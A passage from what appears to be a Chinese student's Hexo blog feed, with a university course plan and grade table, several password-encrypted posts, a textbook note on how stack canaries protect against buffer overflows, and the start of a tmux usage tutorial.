alt="image-20250421171425232"></p><h2 id="修读建议拓扑图"><a href="#修读建议拓扑图" class="headerlink" title="修读建议拓扑图"></a>修读建议拓扑图</h2><p><img src="/./../00000000/image-20250423194338728.png" alt="image-20250423194338728"></p><h1 id="修读计划安排"><a href="#修读计划安排" class="headerlink" title="修读计划安排"></a>修读计划安排</h1><h3 id="1-1-学期"><a href="#1-1-学期" class="headerlink" title="1 - 1 学期"></a><strong>1 - 1 学期</strong></h3><table><thead><tr><th>课程名称</th><th>学分</th><th>选必修</th><th>成绩</th><th>绩点[ 大工算法5.0 ]</th></tr></thead><tbody><tr><td>大学生心理健康教育(上)</td><td>1</td><td>必修</td><td>87</td><td>3.7</td></tr><tr><td>程序设计基础( C语言 )</td><td>3</td><td>必修</td><td>98</td><td>4.8</td></tr><tr><td>体育—基础 1 (体能)</td><td>0.5</td><td>必修</td><td>91</td><td>4.1</td></tr><tr><td>思想道德与法治</td><td>2.5</td><td>必修</td><td>86</td><td>3.6</td></tr><tr><td>大学英语1</td><td>2</td><td>必修</td><td>88</td><td>3.8</td></tr><tr><td>线性代数与解析几何</td><td>3.5</td><td>必修</td><td>76</td><td>2.6</td></tr><tr><td>微积分1</td><td>5</td><td>必修</td><td>74</td><td>2.4</td></tr><tr><td>军训</td><td>2</td><td>必修</td><td>87</td><td>3.7</td></tr><tr><td>大学生生活指导</td><td>1</td><td>必修</td><td>90</td><td>4.0</td></tr></tbody></table><p><strong>大学生生活指导无明确考核形式</strong></p><h4 id="总学分：20-5"><a href="#总学分：20-5" class="headerlink" title="总学分：20.5"></a>总学分：20.5</h4><h3 id="1-2-学期"><a href="#1-2-学期" class="headerlink" title="1 - 2 学期"></a>1 - 2 学期</h3><table><thead><tr><th>课程名称</th><th>学分</th><th>选必修</th><th>成绩</th><th>绩点 [ 大工算法5.0 ]</th></tr></thead><tbody><tr><td>经济学原理</td><td>2</td><td>选修</td><td></td><td></td></tr><tr><td>中国古建筑欣赏与设计</td><td>2</td><td>选修</td><td></td><td></td></tr><tr><td>国家安全教育</td><td>1</td><td>必修</td><td></td><td></td></tr><tr><td>军事理论</td><td>2</td><td>必修</td><td></td><td></td></tr><tr><td>大学生心理健康教育（下）</td><td>1</td><td></td><td></td><td></td></tr><tr><td>生产劳动（二）</td><td>0.5</td><td></td><td></td><td></td></tr><tr><td>人工智能概论</td><td>1</td><td>必修</td><td></td><td></td></tr><tr><td>网络工程专业导论</td><td>1</td><td>选修</td><td></td><td></td></tr><tr><td>微积分2</td><td>5</td><td></td><td></td><td></td></tr><tr><td>概率论与数理统计</td><td>3</td><td></td><td></td><td></td></tr><tr><td>大学物理A1</td><td>3.5</td><td></td><td></td><td></td></tr><tr><td>大学物理实验1</td><td>0.5</td><td></td><td></td><td></td></tr><tr><td>体育—基础2</td><td>0.5</td><td></td><td></td><td></td></tr><tr><td>中国近现代史纲要</td><td>2.5</td><td></td><td></td><td></td></tr><tr><td>智能硬件设计基础</td><td>3</td><td>必修</td><td></td><td></td></tr><tr><td>领导力执行</td><td>1.5</td><td></td><td></td><td></td></tr></tbody></table><p><strong>本学期未选大英2，雅思以考代修成绩未出结果</strong></p><h4 id="总学分：30-5"><a href="#总学分：30-5" class="headerlink" title="总学分：30.5"></a><strong>总学分：30.5</strong></h4><h3 id="1-3-学期"><a href="#1-3-学期" class="headerlink" title="1 - 3 学期"></a>1 - 3 学期</h3><table><thead><tr><th>课程名称</th><th>学分</th><th>选必修</th><th>成绩</th><th>绩点 [ 大工算法5.0 ]</th></tr></thead><tbody><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr><tr><td></td><td></td><td></td><td></td><td></td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>大连理工大学学习</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Story_random_part_one</title>
    <link href="/Story_random_part_one/"/>
    <url>/Story_random_part_one/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="格式是年月日例如20250303." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="19d1b0782d9171229c798fcf4f4e71b1c34189c3ea8d67d90de6d30bc6f3cb63">c605a6a6a90cd74ffaacff13940df969dc6f60553fe0ebca32fa0ea3917fa5b9980a0b79035319aaca1ef299df39a4219cf3f004b9c7ef112eef52189878b1d104140d2dafc0064a96beaa3fc4e6eea528a849200a7c71b3d200e1aefc62ca66a05079a30c5215cc4a7118ac244cf81f1f62c893992111f083c0fd881d62afbda4c502193358f6d1204e440233c122f7e00977b3ad8fa7e408e67b13307e6ef15884e945f136c1df8dbaa0a7059e640a155a0c9b069ee8e2a88a60088ac5a614298d2eeaf81493cd95737f5ee40861844b85641559b4d6c34d893819143f9d01ec8f9bac6bc6d1a686d2df6596e4c16d7404b44c3f9f0712b55bf769f0ed5e50df20698997510456aef9b8e97b82921fe8dd44934a1720a6c84ba6867ae09b45fe448466b0eadfc75d2ad9a6db04f963c80086a71e3382714a893a8fc2d48115d012f6c757ac91410895794054cfdd100ac286dfe48709bf53b13a081640630feb8b90d2fa15e1a8667110b6225357cea2c26c5fc42b3783e82028d9b29795935a2dacd6b41724679b082a043d07b206f0f1530ba1f65e25a0c83b674de4dd824d9f6432b10d54627fa0b4e2ac27fa250447faa42a1a42c05bcfcee96fb2c5b1a8d1c6a3c0c85b9b4965813ac966c61ed711712424bdd87b6ecd0abbc6810f665453d417ed911b6c02945288d6a944e2b5820467a601d6281c50eb2e20f680cb8caeebfa048a9b5c273b00caf71f03a919a92c531ae8b0488eeab04917f9d6ca3e15f3561628c3be1220a9f23393ba5a1a0b13aa0db61b6e91f0fbc7c74624b25dd886fe315d5f8973df6f0d6a08254a055ee59bcc691d8b706d0be6db536f6040b8af4dcea4d93759dee16679830d5352aacf4d1a2bdc234fc7fc7dfb2fc5dfcdcde5ee96d07f8df06758a95de9a3cdf96e439adf6fd2e3bd5830a266edd51d41dd0cc8ac2a1bcc323b314a2baf30c024f620cfae9f66b23a71fab0de629e96f19a7afb5bfe5126400f7f1473203456ade3a28af97e27c997bac29427d45480d8f5dda660941dcf32f540c6dd29672c98c9fa385e542d1f78d13dd58525d84bb92eb0ad8400b13966b3d1e2a133cb78f7ce06a172c82d0a26576f983290a43b4998373682e2db7b172bd5c9b94609e0721d1b7d20b5cf615eb9b872ec7ef8c96b72bd3d604183edb5b0451c47141025b788f99a18dc74c479a6b6cb8bce7c17523feff782bc95d3c638a7cec653e99bc386fc4c061ace6e262c6ab6e95d86d21a832f4b6944a13f5cd5377529666ebc067466526d4c0d552dd22aa19545321553fa317a182b672db92c59ee817fe207fd25a368a97ef7ff22d8c132925d2fa3ad7bd564d2928c34f25833bcc72f9b4899c8fb387e47bff83d630cda5146ffd74ec0f0816eb2c827f635ff9e6a2f06e0d663100d4db001609dde143b3a236cc88806cdcf57c061f7063cdb29c3491a7f2c9218bbed4fdc36885b7a30dfeab6466abbb68b4a17b1f01d6411e536c2c256ee81addff18b9ad0a6a23f3f48975b9bfec900eed873d04ff7360f312926294c3951598e729753f63ef2cea9bdd68b96eb1622a8087d8fdba2499349f1b02f4cb7c53ca86e8a18c97e63e9f576c86cfbcae99c2829391e93ee9163e526879fef1cff87ae7c211e4dc464375ceb31e303d993d0cfebd1c5de4cb19c211750ee5a8b9ee9f0f41d85b65e991834ff6930d8915b8f3bba0d1d43083b90a2f556d1fe4d7d4de19f468849dcf3414d640fbca4bb740d0b1f291eeeab97d532090411fa7d1533c0cc2ef4eda72d827d79191561dc3a109ee34399581d46fcb8d3c080157d0491da0354948ae3d8c4db28bd00cf7adaf9aee6f9e8f07d02e57ace92d13763f4b6998f6ac8ebabb1d9c125b52f92821dd6c3de64c10b05661147124f3b34ce22b9ddedbc798a2e2e89803bd72d59f57fc8390180049f91b48bb51024032f23046937fbc963ec6a10b22e8c2779e4a88bb987b2b4f744f284c267449fb5c104f8bdb7cfd274ff52b23286ffff15e077e98a502c362c7525288a2668a72f764a92e1d5a5209459a8ea36b2cbb5704fade78921f2cc1dd2cdb63bfd4824f27b6aeb9ebd06d69878e1c9f54bb9a3143f7a5c07085c348b00619821e140b5743c43aa92177443b1f25f7b20acb7d763615d2bcbb81974bd04d6311c9906440b4c01b001015950451b3811b198b1ba2fde1b5eb84f588180c3131a087c0d3bd5d89288bb0e2a8a02a4862b387f1d8806f3ded074da2ee4f04a749972fb563961209d3cfea310a33a938805891b8649be31d33738d4b382ed2640c41e65477a1efd456a83009ff6127aeef0cdf24c4a24d2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是你的生日.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>story</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>20250418晚言行反思</title>
    <link href="/%E5%8F%8D%E6%80%9D20250419/"/>
    <url>/%E5%8F%8D%E6%80%9D20250419/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="格式是年月日例如20250303." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="dc893832ff49bbfc4bf1682eb03212b69c23d31881ed59c6d98f6f3dfd2e0957"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是她的生日.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>生活</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Stack_Canaries</title>
    <link href="/Stack_Canaries/"/>
    <url>/Stack_Canaries/</url>
    
    <content type="html"><![CDATA[<h1 id="Stack-Canaries"><a href="#Stack-Canaries" class="headerlink" title="Stack_Canaries"></a>Stack_Canaries</h1><p><strong>canary的地址是栈上的一个随机数，在程序启动时随机生成并保存在比函数的返回地址更低的位置，由于栈溢出从低地址向高地址覆盖，因此攻击者想要控制函数的返回指针就必须先覆盖canary。程序在函数结束前查看canary的值是否发生改变就可以达到保护栈的目的</strong></p><h2 id="常见的Canary："><a href="#常见的Canary：" class="headerlink" title="常见的Canary："></a>常见的Canary：</h2><h4 id="1-terminator"><a href="#1-terminator" class="headerlink" title="1.terminator"></a>1.terminator</h4><p>许多栈溢出都是由于字符串操作使用不当产生的，这些字符串以NULL“\x00”结尾,换个角度想是会被”\x00“截断。基于这一点，terminator canaries将低位设置为“\x00”,<strong>既可以防止被泄露，也可以防止被伪造</strong>。截断字符还有CR（0x0d）,LF（0x0a）,EOF（0xff）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">如果通过字符串操作伪造，在进行字符操作时伪造<span class="hljs-string">&quot;\x00&quot;</span>时就会被截断，所以有效的防止通过字符串操作伪造。</span><br><span class="hljs-meta prompt_">#</span><span class="language-bash">如果想要通过字符串操作泄露canary也会有同样的问题</span><br></code></pre></td></tr></table></figure><h4 id="2-random"><a href="#2-random" class="headerlink" title="2.random"></a>2.random</h4><p>为了防止canary被攻击者猜到，random canary通常在程序初始化时随机生成，并保存在一个相对安全的地方。当然如果攻击者知道它的位置也是可以泄露的。随机数通常由&#x2F;dev&#x2F;urandom生成，有时也用当前时间的哈希值。</p><h4 id="3-random-XOR"><a href="#3-random-XOR" class="headerlink" title="3.random XOR"></a>3.random XOR</h4><p>和random canary类似，但是多了一个XOR操作。无论是canary被修改还是XOR的控制数据被篡改，都会发生错误，这就增加了攻击的难度。</p><p>常见的canary操作示范</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov rax,QWORD PTR fs:0x28<br>mov QWORD PTR [RBP-0X8],rax<br>......<br>mov rax,QWORD PTR [RBP-0X8]<br>xor rax,QWORD PTR fs:0x28<br>je 0x4005f8&lt;main+66&gt;#函数正常进行的流程<br>call 0x400480 &lt;__stack_chk_fail@plt&gt;<br>leave<br>ret<br></code></pre></td></tr></table></figure><p>在Linux中fs段通常用于存放线程局部存储( Thread Local Storage,TLS ),其主要作用是为了避免多个线程同时访问同一全局变量或静态变量所导致的冲突，尤其是多个线程需要同时修改这一变量时。</p><p>TLS</p>]]></content>
    
    
    <categories>
      
      <category>CTF_PWN</category>
      
      <category>blog_learning</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>食堂饭饭</title>
    <link href="/%E9%A3%9F%E5%A0%82%E9%A5%AD%E9%A5%AD/"/>
    <url>/%E9%A3%9F%E5%A0%82%E9%A5%AD%E9%A5%AD/</url>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="格式是年月日例如20250303." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="c9f07ca65761d163a2a44d7f3fbf1da2cd6f9d821d71ec2aac8698ee48894082">c605a6a6a90cd74ffaacff13940df969dc6f60553fe0ebca32fa0ea3917fa5b98c224ac78b78cc113e8195acca3a9ff14bb9426feea9cfb9c6bc4c19e090aa4f8fe55afad4b956363c0ef65745618e024e0bf6c6f3ab48fb5917349ca6dfe1d60170db32d95e6d4e965bb6850e37635bb713d9c36dd76c268825528a268416f021d111b45549425ab17eb8242b8ab8496bdc047fe16fa2becde2fbab7e7781da1d7acdd2e1284f78fd39d9580a3f4a5c6d6efd33109df34e4c1feb7a77e09bdb90dcd163ad5ae5e5d97f7492ae5385a566ec20772c9fe29fb5007ecdb176bddec78e317d2aaeb094f1df92131e20308e6e14eeaa99ebe5f7a8e8935f6e094e3fa72bfc9bc3788900a3ac62c43703d28cbc57647bb5e03ca91e84726281cd04406cc4cf0555063a2e081e2f4d86b6fb4cfdafe340251b2b4d2a1d60831d576e810e83f029be8ebd8fb68c5b96fcd575dc13cf566d07713f27bcc3bc0febca8561fd368edb6d59ae954749f825d00aba48312d879e81d799edfe586a5987fdb4234089282b1244776e87c51e9271b3c10da23b1b78a96dddb13b11ae34d21f0d9162c3d6c01668f7533f653e031d19151bdb4e3020fb64e8c1dc423bec5983addb855c43602034305f2c26223be430b82e3aed06ac0f794c0780f012e3b8821fc467e69b267d87ace4b78dfe5957c1bbef2241314855a0b731e29e45689143349a51fdd280506c1f77ebfcf303bc3439f0f3936c4d0c0d4a0dacb5c272d9c687749fad97af593c240f5842252d5905c5d4bd0075665cea334462a42649e5acf0edd80ab1757d75d698f77a59f7b483ce2df1008c5a0e019ef18bfaa2126ce57f9ba51a8dc1fd77355deba0a8808e90296065d4399366751db92a0326d30acaa652d430a28a21e7a84e9f3c3b8e384cf358199df8e26cfc28fe896d1985a33b27599e4f3a2021e1298f76f63c24fd1019e02a717f23db8c63667b27b8ce1c326889b33d364c62616a63495b3915ed45b69c12540ebcae932071e13c672804a77abef9281402c5689cffc38231a7c9d9d806ee178b39cd8e55d74daef4f25890b3f5a5a5478a54f65130957fee0ec5913d109d6212c662c30d28dc76e0e82c26162c372a6d62729f1c6e7fd5f9b0fed5d21637ff1929727bf0136760a88461f97cf55499d541d7134f040440277843cf90b1d11a7a3f5b1d4878f0741d09ad017ac90d3abd6025a74803207d2e2b447aaec07bd0ff6d074bce247899b5507f8499a45ebf4bdec10ca2a0dd785a7fbcda10c69064881702d511a306f131a025bd42ac7c87c8ddbf5662102f4735b46144c75713719b1072dc29a48b9884822273ed2566fa216d5371ce0d34eea1bce158135ca2095c0e4562fe2b081e0c390f6e0dacb02a620f021cd8882000d732a45ddc0183c6c09cbee7744ac2abd0c6954dcd09565c4d3d2d77a6e96994c046babd06f85f8a91aa12fac9789162cb8d037fecd68c77ef4510fd2040c4ed19a79e5153da8f37a46f4a47de8612be74a5063451967f3c9395c54d8049b03c7fd2f54a9534892ac00593ce78a8d02f2681ebb6f9a59bee17f8d80a057a51699b7e62c947c8a7bb8eb085a43bec3f59f43dc3cb65b7bf718d51ca869bcf101c364e49c92b295e08d2586495accac01ff0c1cf4a27a2a8668a06104a2ad878faa8b9a6e3a9b1c31e76b5795f01114a7f0298c122d1e5606eff533808d2ca35877b85c95516c642ace453adebde7257445f84e15727ce72fe05a397aca91dbe562576025ef12c80b17d0b7538ba7fef19ef277d3d78588005a1714229f062cc86e414b07dc06f49fef0b926469f0d70c13264985dece932a3eb448506bcf26a8271c8228bcafb591d08699fcf4d54e80e12e6a3c58ac828f9e40929a5e95c3c3c9ede86cf013ff386213072c026720121d97ec48e3712df0b79a0e5262e873d121144b2c6c0f02908cf4b9063e4443bdee4d28918ab11bb8b98a5c2f1be2a73afecfc530282cf61032728918b722681b0d1d2c40973fbe5a61a9b4dd4ede9b04250f13c9b23ed0fb9d849baa3fc078bea1e9749bc590a67287f8452db037e9b9bbb6b9cdb592ff5665794278ed241abd5980e66111f445e795ddc3314babd77e07841a4b9a81eed01c658370e7b3a3e7b5851fdd98ab228f6fdc8df900e385d73f7135afeb6979b7d325af6251c424f655c916a2a522ab6592cea429870623e0ae2a74768be924c10c0baa76ccfa7f905492fb8fc8c6a905c1821c48dee8cbbf1f2c36fcc46dee7a72d9ca9e550b5ac71ce0423e841220dcd9c4f845da39b2473392928f1bc0afb0dc5d3ffa2b4c243a774b3149aea41ce1c392e246a92b7d1cdc262c413deddd5782d47601301f6e4d0c587a65e779ed73e88baec8b8e3b0b3f9b467c875dee316a3d372835dfdb6fa4e75b132a6c695ed022d1c1bb4aacdd2ecb9060b9327d680cb86794f0dd8941d8c3a069c1d87bbd3e81068bac06a72c4ee5c00e2d13b239c7cc8225694b0bef1a6c793d2fd6f93ff3ab94edd17d39ee5f4235b09952da4668900c80eb3f5fa220255694f6d4b4d5eb34dd52f675d6fc65b4c99d83cb6a7de3eeac3dcfe8e99bb81e51e18ee09489eb315104f51cbb1b4f0014527e81ad4b9860160494babd361a6eb00c77e3e7f70ca1d59b456ff870eae81bef27bda6ddeafc13e22aec7f29b1d1e00cf396f3c022a7f3f5304a4b68a39cc9c1b82af4d88bec76c7452527a06fb42aa01d908fcede0c03135266468f63c001c0d4820aad40a08afabdf634d0a3bf101bc8c3fcb1b9a8111ac18ceb8dbe1423c562064737592e6da69de725377c62b47df9741f5f331c71200d7e3f11ecaf50b7eddf705abbaedbfc244e8cccd7f0dc7796ecc05a5b58ad0c5394d407db617272fe715163b282a65e2bcb65e8ee48f6eb69f856bfb4c1bbb2779c0ec2d5be6d93ca12f34960b8f05dbca76e85689dfbe6748d770643da61dc63c7b384c1d94f9621c24e4fc968fd72f65abcfa456c59fee450bb7228d1e7eb1248e2e616f834f06d50ae6b027e43365b7a79ba15a7ae20de6aa85cade1d5b9a3818c3a8d26faed92a51cc43d0dff6f9411d4da990024c2e37d4facc84acd539f14052efa43c8309aba1c89c76f5cb47597d75bf7dffc94364444d4365d32ab048e6115d64a96b25311f3ac84c122513633a2e9b47b6f74cce98552ad50ac8f7169daa5337c98ba93e04df5b595d953ff0ae6c7a69b3cc99f82f5980bda763bdff666b84d8ca748543b863cc9930d8f1ca8dbea58a4a9458f925bfa76da690874638e033a3ff86b4fc57220e2d100dc13e904be70d72817d97ff7740457c4bf2324344c73d14642e64927d445e4875f2613079aa1a0987d2d1b5fbdee71400f83fb3e915a419156985fccf42990aae9117c479ca185ffa0de579a19b422dbd509580779d00381eec049a0fb6873960653dc971ddf6a88799a93c1328a5e731a6c9b00b5428610eb8be6a50e117a59b5379067e3737672025a4cb65f2ca2bfdfd313caee4da5634dc624142bdc694d73d002db29dfc1a31253ebbf023a64b5eabb9907b76c5db0a13503649a99ac74956ff37e213c87628e0bfa4dd3758adb6141114bacab55ffc03da1189cfa8f9b287c32145ce177d038549f8b906e42ea3f9f2a03831c7babd7067ac26800a48108ab7bf066f857d092129b7c1424c7ebcf65ba405fdbb118bdd5b7d7d79e92ec198a0f2e993b24284011676900bbb8fc24241cd58440595f2a947ebcee73c5965dfc0895b3c5f6ce688f0d6e5ea98108a1d3a9fe47497bad3dbdcf875ab779ed770b1a4225255f5bd43886bd1aa65cf18d377349177db094b3f1a25e8184c22540324f68d3429829648a65af4101463edae15677d4ec0f3d9a415a483bdce6796260f27d8fa47a3657dc510a1269f5e07976bca2dec74405f09e9a1068a58171104a0628c576bfabf8c27bc09b9cfcabce75dc6fd51de41601bce7f749783c4b25ab95040d23306b598c60061a03e4cef6427428e7fc352977751840a15813b4d7f50fbd7c93e9e65f71392c281ed5a33e1b6f14b9e959d13d1fb6e4f23d05374ab419abb2b4965046447c4afcf507f08e75700315b76af1f85accf24a9de5c8800e502a6cf924401549ec2e8278bc7a046864a9d8f3fe43dbb6042e7851c00588f5ca3fec8eae05db2edbd4565bbe20a90bf2d5ce90d167e1616fe624d1d7296baab3dfc664128c1e5784d742ca3e548f4c0f8b080f83569c76d342e9f8d9e44a5376e2e3b6197abbb44b2f5b7a83921892da3db39d7873b44259eee7eea6fdd1dd9f5768dc98e278fe5e2ef0109fc6b959d138aae7f3bfc8abc0cff2ad0d38286eaef01d0b2756c671aba9de4b8e5cd054f7e671e3eced0d0056402081612ff3cb7cafdd4732c6f6ddab653fb2d627db598273abcb99cccf78c3bdf34e650c632caef582a869a61bdb84c9b18071ec49817700850ccc7b934a42706ffdd6b5b28debbe0faf4ec78b29b26fe2348b9d6fcaf086f85107339b19762f560d0d62998a5bb9a331d22f8e8e7a385d4fb0df2f3fcd7637ec38a0074b9ac26a5327e170cc13604132239a2bbbd7c641e3e055e859cedea721993cf514e85ab92a82e7b6306f0f3ac783181fb46db66342df1f0a5c8bb5cf174abf6293b0854d4f307387c1f9713e5a78c8da2a16606483ba015b58ee4e06f544a27901d9dadf9152d060333c112698c99da5867ec2e121fbe3d84780db3782888608c7f68317530000c863d608b18f8e301830bbfeb1080ec68fd83a488a74951a446d58bc9b1f32391256329aba3370f3172bddbc6dae1e43adb303676cb17b3f903d445a82a717680bf79f87f29e4f95b933307984e95fd70a82aa483c44c829e598defb1eb26bb7017aa7195e04c37811655da2203ef18ad979bba98751b5419c639bcd5446f823bc70667cb5a3384ca154be5175c512f3019a30d63ef7905212f2cd0462de0ad729af10945314891b499d18fffdd2ee9b420f79f01c7866826087a924e1b80735f20eb9ae5044757cb146be1da35da091b4994b20fa2affcefefd881cdd9f953cb23a920d404a2730ae3f601f313de3ef7193308568858e7bb4e0bca57f5e43941aecbcfe66a2defd8d9ff191b8982859cf226af914f4d8c210a203e74781c85f80285f6f49b72a1c0c22953c34df5e3289b3a112186029891be5cae568eaeee16056cb9b3b44a59c8e7c47c83de2795ee88f709cb0a71e700b17c5af46cfa90e1c5bdba293326f142f060356a8b6bc83307eec04cb4b9d1ecd4c765d48afd85ba1fb64346a89b506a9786d1f2ddbd0de98ec64d7014cee5d70c409a283563c8faa22b4e1ebb00c387754a3c65462d9d2ce9ff68de7511dfad7d729a6d17d96c224ca6db2b40cf87c09dee36dfd3b4cf95bfdc759fd07240da9402d8eb4adefa78bf297d4ff2384a21962de1832baff95252c341da6636caa2491373b</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">密码是她的生日.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <categories>
      
      <category>Security</category>
      
      <category>小周同学</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>TMUX终端复用器</title>
    <link href="/tmux%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8%E5%99%A8/"/>
    <url>/tmux%E7%BB%88%E7%AB%AF%E5%A4%8D%E7%94%A8%E5%99%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="tmux终端复用器"><a href="#tmux终端复用器" class="headerlink" title="tmux终端复用器"></a>tmux终端复用器</h1><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">Ubuntu or Debian</span><br>sudo apt-get install tmux<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">CentOS or Fedora</span><br>sudo yum install tmux<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">Mac</span><br>brew install tmux<br></code></pre></td></tr></table></figure><h3 id="Session操作"><a href="#Session操作" class="headerlink" title="Session操作"></a>Session操作</h3><h5 id="1-启动"><a href="#1-启动" class="headerlink" title="1.启动"></a>1.启动</h5><p>在terminal上输入tmux命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tmux<br></code></pre></td></tr></table></figure><p>也可以在建立时，显式地说明tmux的名字，这个名字可以用于解绑后快速的重新进入该session:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tmux new -s your-session-name<br></code></pre></td></tr></table></figure><h5 id="2-分离"><a href="#2-分离" class="headerlink" title="2.分离"></a>2.分离</h5><p>在tmux窗口中，按下<code>ctrl+b d</code>或输入如下命令，就会讲当前的session和窗口分离，session转到后台运行:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tmux detach<br></code></pre></td></tr></table></figure><h5 id="3-退出"><a href="#3-退出" class="headerlink" title="3.退出"></a>3.退出</h5><p>如果你想退出该session，你可以杀死session:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tmux kill-session -t your-session-name<br></code></pre></td></tr></table></figure><h5 id="4-绑定，解绑，切换session"><a href="#4-绑定，解绑，切换session" class="headerlink" title="4.绑定，解绑，切换session"></a>4.绑定，解绑，切换session</h5><p>再次绑定某个session:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tmux attach -t your-session-name<br></code></pre></td></tr></table></figure><p>切换到某个指定的session</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tmux switch -t your-session-name<br></code></pre></td></tr></table></figure><h5 id="5-重命名session"><a href="#5-重命名session" class="headerlink" title="5.重命名session"></a>5.重命名session</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">tmux rename-session -t old-session new-session<br></code></pre></td></tr></table></figure><h3 id="pane操作"><a href="#pane操作" class="headerlink" title="pane操作"></a>pane操作</h3><h5 id="1-窗格划分："><a href="#1-窗格划分：" class="headerlink" title="1.窗格划分："></a>1.窗格划分：</h5><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">划分为上下两个窗格</span><br>tmux split-window<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">划分左右两个窗格</span><br>tmux split-window -h<br></code></pre></td></tr></table></figure><p>划分窗格使用快捷键会更加方便 [如果当前pane正在运行程序就没办法输入命令了]</p><p><code>左右划分</code>：<code>ctrl+b %</code><br><code>上下划分</code>：<code>ctrl+b &quot;</code></p><h5 id="2-光标位置切换"><a href="#2-光标位置切换" class="headerlink" title="2.光标位置切换"></a>2.光标位置切换</h5><p>使用语句太复杂了，直接使用快捷键最好：ctrl+b arrow-key（方向键）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">当前窗格往上移</span><br>tmux swap-pane -U<br><span class="hljs-meta prompt_"></span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">当前窗格往下移</span><br>tmux swap-pane -D<br></code></pre></td></tr></table></figure><h5 id="3-关闭窗格"><a href="#3-关闭窗格" class="headerlink" title="3.关闭窗格"></a>3.关闭窗格</h5><p><code>ctrl+d</code>，如果只有一个窗格就是关闭</p><h3 id="tmux上下翻页"><a href="#tmux上下翻页" class="headerlink" title="tmux上下翻页"></a>tmux上下翻页</h3><p>使用快捷键<code>ctrl+b [ 